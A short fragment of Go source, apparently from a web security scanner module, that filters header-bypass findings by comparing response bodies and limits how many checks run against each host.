		return true // header flipped the status → causal, keep
	}
	if modkit.BodiesSimilar(bypassBody, body) {
		return false // same response with or without the header → no effect, drop
	}
	return true
}

// markAndShouldContinue marks the host as checked and returns true if it should continue
func (m *Module) markAndShouldContinue(urlx *urlutil.URL, scanCtx *modkit.ScanContext) bool {
	diskSet := m.ds.Get(scanCtx.DedupMgr())
	if diskSet == nil {
		return true
	}
	host := urlx.Hostname()
	_, shouldContinue := diskSet.IncrementAndCheck(host, m.limitCheckPerHost)
	return shouldContinue
}
